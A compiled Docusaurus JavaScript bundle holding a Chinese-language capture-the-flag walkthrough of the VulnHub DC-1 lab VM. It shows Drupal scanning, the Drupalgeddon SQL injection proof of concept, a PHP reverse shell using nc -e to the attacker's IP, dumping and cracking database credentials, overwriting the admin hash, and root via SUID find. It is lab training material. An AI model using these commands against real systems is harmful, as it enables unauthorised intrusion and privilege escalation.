"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[7138],{6593:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>i,contentTitle:()=>l,default:()=>o,frontMatter:()=>c,metadata:()=>r,toc:()=>t});const r=JSON.parse('{"id":"VulnHub/Virtual Machines/DC-1","title":"DC-1","description":"DC-1\u6e17\u900f\u6d4b\u8bd5\u8fc7\u7a0b","source":"@site/docs/VulnHub/Virtual Machines/DC-1.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/DC-1","permalink":"/docs/VulnHub/Virtual Machines/DC-1","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/DC-1.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"Breach2.1","permalink":"/docs/VulnHub/Virtual Machines/Breach2.1"},"next":{"title":"DC-2","permalink":"/docs/VulnHub/Virtual Machines/DC-2"}}');var d=s(4848),a=s(8453);const c={},l=void 0,i={},t=[{value:"DC-1\u6e17\u900f\u6d4b\u8bd5\u8fc7\u7a0b",id:"dc-1\u6e17\u900f\u6d4b\u8bd5\u8fc7\u7a0b",level:2},{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:3},{value:"\u8bbf\u95eeweb\u9875\u9762",id:"\u8bbf\u95eeweb\u9875\u9762",level:3},{value:"\u6f0f\u6d1e\u53d1\u73b0\u548c\u5229\u7528",id:"\u6f0f\u6d1e\u53d1\u73b0\u548c\u5229\u7528",level:4},{value:"\u5229\u7528mysql\u91cd\u7f6e\u5bc6\u7801",id:"\u5229\u7528mysql\u91cd\u7f6e\u5bc6\u7801",level:4},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:3},{value:"\u603b\u7ed3",id:"\u603b\u7ed3",level:3}];function h(n){const e={a:"a",blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",h4:"h4",img:"img",p:"p",pre:"pre",strong:"strong",...(0,a.R)(),...n.components};return(0,d.jsxs)(d.Fragment,{children:[(0,d.jsx)(e.h2,{id:"dc-1\u6e17\u900f\u6d4b\u8bd5\u8fc7\u7a0b",children:"DC-1\u6e17\u900f\u6d4b\u8bd5\u8fc7\u7a0b"}),"\n",(0,d.jsx)(e.h3,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-bash",children:"nmap -sC -sV -Pn 192.168.56.119\n"})}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-bash",children:"PORT    STATE SERVICE\r\n22/tcp  open  ssh\r\n80/tcp  open  http\r\n111/tcp open  rpcbind\n"})}),"\n",(0,d.jsx)(e.p,{children:"\u5f00\u4e86\u4e09\u4e2a\u7aef\u53e3"}),"\n",(0,d.jsx)(e.h3,{id:"\u8bbf\u95eeweb\u9875\u9762",children:"\u8bbf\u95eeweb\u9875\u9762"}),"\n",(0,d.jsxs)(e.p,{children:["\u53d1\u73b0\u662f",(0,d.jsx)(e.code,{children:"drupal"}),"\u8fd9\u4e2acms\uff0c\u7528",(0,d.jsx)(e.code,{children:"droopescan"}),"\u8fdb\u884c\u626b\u63cf"]}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-bash",children:"droopescan scan drupal -u http://192.168.56.119\n"})}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-bash",children:"[+] Possible version(s):\r\n    7.22\r\n    7.23\r\n    7.24\r\n    7.25\r\n    7.26\r\n\r\n[+] Possible interesting urls found:\r\n    Default admin - http://192.168.56.119/user/login\r\n\r\n[+] Scan finished (0:07:52.768780 elapsed)\n"})}),"\n",(0,d.jsx)(e.p,{children:"\u626b\u5230\u5927\u6982\u7248\u672c\u548c\u767b\u5f55\u9875\u9762"}),"\n",(0,d.jsx)(e.h4,{id:"\u6f0f\u6d1e\u53d1\u73b0\u548c\u5229\u7528",children:"\u6f0f\u6d1e\u53d1\u73b0\u548c\u5229\u7528"}),"\n",(0,d.jsx)(e.p,{children:"\u5bfb\u627e\u76f8\u5173\u6f0f\u6d1e"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-bash",children:"searchsploit drupal 7\n"})}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.code,{children:"Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)"})}),"\n",(0,d.jsxs)(e.p,{children:["\u627e\u5230\u4e86\u8fd9\u4e2a",(0,d.jsx)(e.code,{children:"POC"}),"\uff0c\u5c1d\u8bd5\u662f\u5426\u53ef\u4ee5\u5229\u7528"]}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-bash",children:"python2 34992.py -t http://192.168.56.119/ -u dabai -p 123456\n"})}),"\n",(0,d.jsxs)(e.p,{children:["\u7136\u540e\u5c31\u53ef\u4ee5\u767b\u5f55\u8be5\u8d26\u53f7\uff0c\u627e\u5230",(0,d.jsx)(e.strong,{children:"flag3"})]}),"\n",(0,d.jsxs)(e.blockquote,{children:["\n",(0,d.jsx)(e.p,{children:"Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow."}),"\n",(0,d.jsx)(e.p,{children:"\u7279\u6b8a\u7684perms\u5c06\u6709\u52a9\u4e8e\u67e5\u627e\u5bc6\u7801\uff0c\u4f46\u60a8\u9700\u8981\u6267\u884c\u8be5\u547d\u4ee4\u624d\u80fd\u627e\u5230shadow\u4e2d\u7684\u5185\u5bb9"}),"\n"]}),"\n",(0,d.jsxs)(e.p,{children:["\u627e\u5230",(0,d.jsx)(e.code,{children:"Modules"}),"\uff0c\u52fe\u9009**",(0,d.jsx)(e.code,{children:"PHP filter"}),"**\uff0c\u5e76\u8bbe\u7f6e\u6743\u9650\u3002\uff0c\u5c06",(0,d.jsx)(e.code,{children:"Use the PHPcode text format"}),"\u8bbe\u7f6e\u4e3a\u7ba1\u7406\u5458"]}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240418204912750.png",alt:"image-20240418204912750"})}),"\n",(0,d.jsxs)(e.p,{children:["\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5728\u6587\u7ae0\u91cc\u5199",(0,d.jsx)(e.code,{children:"PHP\u4ee3\u7801"})]}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-php",children:'<?php system("nc -e /bin/bash 192.168.56.101 1234");?>\n'})}),"\n",(0,d.jsxs)(e.p,{children:["\u627e\u5230",(0,d.jsx)(e.strong,{children:"flag1"})]}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-bash",children:"www-data@DC-1:/var/www$ cat flag1.txt\r\nEvery good CMS needs a config file - and so do you.\n"})}),"\n",(0,d.jsx)(e.h4,{id:"\u5229\u7528mysql\u91cd\u7f6e\u5bc6\u7801",children:"\u5229\u7528mysql\u91cd\u7f6e\u5bc6\u7801"}),"\n",(0,d.jsx)(e.p,{children:"\u63d0\u793a\u67e5\u770b\u914d\u7f6e\u6587\u4ef6\uff0c\u4f4d\u4e8eDrupal\u5b89\u88c5\u76ee\u5f55\u4e0b\u7684/sites/default/\u6587\u4ef6\u5939\u4e2d"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-bash",children:"www-data@DC-1:/var/www/sites/default$ cat settings.php\r\ncat settings.php\r\n<?php\r\n\r\n/**\r\n *\r\n * flag2\r\n * Brute force and dictionary attacks aren't the\r\n * only ways to gain access (and you WILL need access).\r\n * What can you do with these credentials?\r\n *\r\n */\r\n\r\n$databases = array (\r\n  'default' => \r\n  array (\r\n    'default' => \r\n    array (\r\n      'database' => 'drupaldb',\r\n      'username' => 'dbuser',\r\n      'password' => 'R0ck3t',\r\n      'host' => 'localhost',\r\n      'port' => '',\r\n      'driver' => 'mysql',\r\n      'prefix' => '',\r\n    ),\r\n  ),\r\n);\n"})}),"\n",(0,d.jsxs)(e.p,{children:["\u53d1\u73b0",(0,d.jsx)(e.strong,{children:"flag2"})]}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{children:"flag2\r\nBrute force and dictionary attacks aren't the\r\nonly ways to gain access (and you WILL need access).\r\nWhat can you do with these credentials?\r\n\u7206\u7834\u653b\u51fb\u548c\u5b57\u5178\u653b\u51fb\u4e0d\u662f\r\n\u83b7\u5f97\u8bbf\u95ee\u6743\u9650\u7684\u552f\u4e00\u65b9\u6cd5(\u60a8\u5c06\u9700\u8981\u8bbf\u95ee\u6743\u9650)\u3002\r\n\u4f60\u80fd\u7528\u8fd9\u4e9b\u8bc1\u4e66\u505a\u4ec0\u4e48?\n"})}),"\n",(0,d.jsxs)(e.p,{children:["\u627e\u5230",(0,d.jsx)(e.code,{children:"Mysql"}),"\u7684\u8d26\u6237\uff0c\u5c1d\u8bd5\u767b\u5f55"]}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-bash",children:"mysql -udbuser -pR0ck3t\n"})}),"\n",(0,d.jsxs)(e.p,{children:["\u7136\u540e\u5728",(0,d.jsx)(e.code,{children:"drupaldb"}),"\u6570\u636e\u5e93\uff0c",(0,d.jsx)(e.code,{children:"users"}),"\u8868\u4e0b\uff0c\u67e5\u770b\u4e86\u7528\u6237\u540d\u548c\u5bc6\u7801"]}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-sql",children:"select name,pass from users;\n"})}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{children:"+-------+---------------------------------------------------------+\r\n| name  | pass                                                    |\r\n+-------+---------------------------------------------------------+\r\n| admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |                                     \r\n| Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |                                     \r\n+-------+---------------------------------------------------------+\n"})}),"\n",(0,d.jsx)(e.p,{children:"\u7528john\u8fdb\u884c\u7206\u7834\u54c8\u5e0c\uff0c\u53d1\u73b0\u90a3\u4e2a\u7528\u6237\u90fd\u7206\u7834\u4e0d\u51fa\u6765\uff0c\u90a3\u5c31\u5c1d\u8bd5\u4fee\u6539"}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.code,{children:"john admin --wordlist=/usr/share/wordlists/rockyou.txt"})}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.code,{children:"john Fred --wordlist=/usr/share/wordlists/rockyou.txt"})}),"\n",(0,d.jsxs)(e.p,{children:[(0,d.jsx)(e.code,{children:"drupal"}),"\u5e38\u7528\u5bc6\u7801\u52a0\u5bc6\u662f",(0,d.jsx)(e.code,{children:"MD5\u683c\u5f0f"}),"\uff0c\u4f46\u662f7.0\u4ee5\u540e\u56e0\u4e3a\u5b89\u5168\u6027\u95ee\u9898\u5c06\u52a0\u5bc6\u65b9\u5f0f\u6539\u6210\u4e86hash\u52a0\u5bc6"]}),"\n",(0,d.jsx)(e.p,{children:(0,d.jsx)(e.a,{href:"http://drupalchina.cn/node/1964",children:"Drupal7\u5bc6\u7801\u91cd\u7f6e"})}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-bash",children:"www-data@DC-1:/var/www$ php ./scripts/password-hash.sh 123456\r\nphp ./scripts/password-hash.sh 123456\r\n\r\npassword: 123456                hash: $S$DmIUpIuKdJDVbkgk5BN6BFLX1ASLJB5H9LCYdzwjflmNjrOOE4zy\n"})}),"\n",(0,d.jsxs)(e.p,{children:["\u4e00\u5b9a\u4e0d\u8981\u8fdb",(0,d.jsx)(e.code,{children:"scripts"}),"\u76ee\u5f55\uff0c\u7136\u540e\u4fee\u6539",(0,d.jsx)(e.code,{children:"users"}),"\u8868"]}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{children:"update users set pass='$S$DdjovdQivVxu7Nqjmxb1bbxZtzuiEBHDfqogPLcuSUMtB25gM/u/' where name='admin';\n"})}),"\n",(0,d.jsx)(e.p,{children:"\u7136\u540e\u5c31\u53ef\u4ee5\u767b\u5f55\u4e86(\u8fd9\u91cc\u548c\u524d\u9762\u589e\u52a0\u7684\u8d26\u53f7\u662f\u4e00\u6837\u7684\u6548\u679c\uff0c\u9884\u671f\u89e3\u5e94\u8be5\u662f\u8fd9\u6837)"}),"\n",(0,d.jsx)(e.h3,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,d.jsx)(e.p,{children:"\u90a3\u5c31\u56de\u5230\u9776\u673a"}),"\n",(0,d.jsxs)(e.p,{children:["\u67e5\u770b",(0,d.jsx)(e.code,{children:"passwd"}),"\u6587\u4ef6\uff0c\u6709\u4e00\u4e2a",(0,d.jsx)(e.code,{children:"flag4"}),"\u7528\u6237"]}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-bash",children:"www-data@DC-1:/var/www$ cat /etc/passwd\r\ncat /etc/passwd\r\nroot:x:0:0:root:/root:/bin/bash\r\n......\r\nflag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash\n"})}),"\n",(0,d.jsxs)(e.p,{children:["\u8fdb\u5165",(0,d.jsx)(e.code,{children:"flag4"}),"\u7684\u5bb6\u76ee\u5f55\uff0c\u53d1\u73b0",(0,d.jsx)(e.strong,{children:"flag4"})]}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-bash",children:"bash-4.2$ ls -l\r\nls -l\r\ntotal 4\r\n-rw-r--r-- 1 flag4 flag4 125 Feb 19  2019 flag4.txt\r\nbash-4.2$ cat flag4.txt\r\ncat flag4.txt\r\nCan you use this same method to find or access the flag in root?\r\n\r\nProbably. But perhaps it's not that easy.  Or maybe it is?\n"})}),"\n",(0,d.jsxs)(e.p,{children:[(0,d.jsx)(e.code,{children:"shadow"}),"\u6587\u4ef6\u8fd8\u4e0d\u80fd\u67e5\u770b"]}),"\n",(0,d.jsxs)(e.p,{children:[(0,d.jsx)(e.code,{children:"sudo"}),"\u547d\u4ee4\u4e0d\u80fd\u7528\uff0c\u67e5\u770b\u6709suid\u6743\u9650\u7684\u6587\u4ef6\uff0c\u4e00\u773c\u770b\u5230",(0,d.jsx)(e.code,{children:"find"})]}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-bash",children:"www-data@DC-1:/var/www$ find / -type f -perm -4000 2>/dev/null\r\nfind / -type f -perm -4000 2>/dev/null\r\n/bin/mount\r\n/bin/ping\r\n/bin/su\r\n/bin/ping6\r\n/bin/umount\r\n/usr/bin/at\r\n/usr/bin/chsh\r\n/usr/bin/passwd\r\n/usr/bin/newgrp\r\n/usr/bin/chfn\r\n/usr/bin/gpasswd\r\n/usr/bin/procmail\r\n/usr/bin/find\r\n/usr/sbin/exim4\r\n/usr/lib/pt_chown\r\n/usr/lib/openssh/ssh-keysign\r\n/usr/lib/eject/dmcrypt-get-device\r\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\r\n/sbin/mount.nfs\n"})}),"\n",(0,d.jsx)(e.p,{children:"find\u63d0\u6743"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-bash",children:'www-data@DC-1:/var/www$ find / -exec "/bin/sh" \\;\r\nfind / -exec "/bin/sh" \\;\r\n# id\r\nid\r\nuid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)\n'})}),"\n",(0,d.jsx)(e.p,{children:"\u76f4\u63a5\u5c31\u62ff\u5230\u4e86root\u6743\u9650\uff0c\u62ff\u5230\u6700\u7ec8flag"}),"\n",(0,d.jsx)(e.pre,{children:(0,d.jsx)(e.code,{className:"language-bash",children:"# cd /root\r\ncd /root\r\n# ls\r\nls\r\nthefinalflag.txt\r\n# cat t*\r\ncat t*\r\nWell done!!!!\r\n\r\nHopefully you've enjoyed this and learned some new skills.\r\n\r\nYou can let me know what you thought of this little journey\r\nby contacting me via Twitter - @DCAU7\n"})}),"\n",(0,d.jsx)(e.h3,{id:"\u603b\u7ed3",children:"\u603b\u7ed3"}),"\n",(0,d.jsxs)(e.blockquote,{children:["\n",(0,d.jsxs)(e.p,{children:["1.\u6211\u5e76\u6ca1\u6709\u6309MSF\u7684\u65b9\u6cd5\u8fdb\u884c\u6f0f\u6d1e\u5229\u7528\uff0c\u800c\u662f\u5148\u6253web\u6f0f\u6d1e\u5f97\u5230\u540e\u53f0\u8d26\u53f7\uff0c\u7136\u540e\u5229\u7528",(0,d.jsx)(e.code,{children:"PHP filter"}),"\u6a21\u5757\u6267\u884c",(0,d.jsx)(e.code,{children:"PHP\u4ee3\u7801"}),"\uff0c\u53cd\u5f39shell,\u63d0\u6743"]}),"\n",(0,d.jsxs)(e.p,{children:["2.\u8ba4\u8bc6\u4e00\u6b3e",(0,d.jsx)(e.code,{children:"droopescan"}),"\u626b\u63cf\u5668\uff0c\u53ef\u4ee5\u626b",(0,d.jsx)(e.code,{children:"drupal\u8fd9\u4e2acms"})]}),"\n",(0,d.jsxs)(e.p,{children:["3.",(0,d.jsx)(e.code,{children:"drupal"}),"\u6570\u636e\u5e93\u4e2d\u5bc6\u7801\u7684\u52a0\u5bc6\u65b9\u5f0f\u662f\u5229\u7528",(0,d.jsx)(e.code,{children:"/scripts/password-hash.sh"}),"\u8fd9\u4e2a\u6587\u4ef6"]}),"\n",(0,d.jsxs)(e.p,{children:["4.",(0,d.jsx)(e.code,{children:"find"}),"\u63d0\u6743",(0,d.jsx)(e.code,{children:'find / -exec "/bin/sh" \\;'})]}),"\n"]})]})}function o(n={}){const{wrapper:e}={...(0,a.R)(),...n.components};return e?(0,d.jsx)(e,{...n,children:(0,d.jsx)(h,{...n})}):h(n)}},8453:(n,e,s)=>{s.d(e,{R:()=>c,x:()=>l});var r=s(6540);const d={},a=r.createContext(d);function c(n){const e=r.useContext(a);return r.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function l(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(d):n.components||d:c(n.components),r.createElement(a.Provider,{value:e},n.children)}}}]);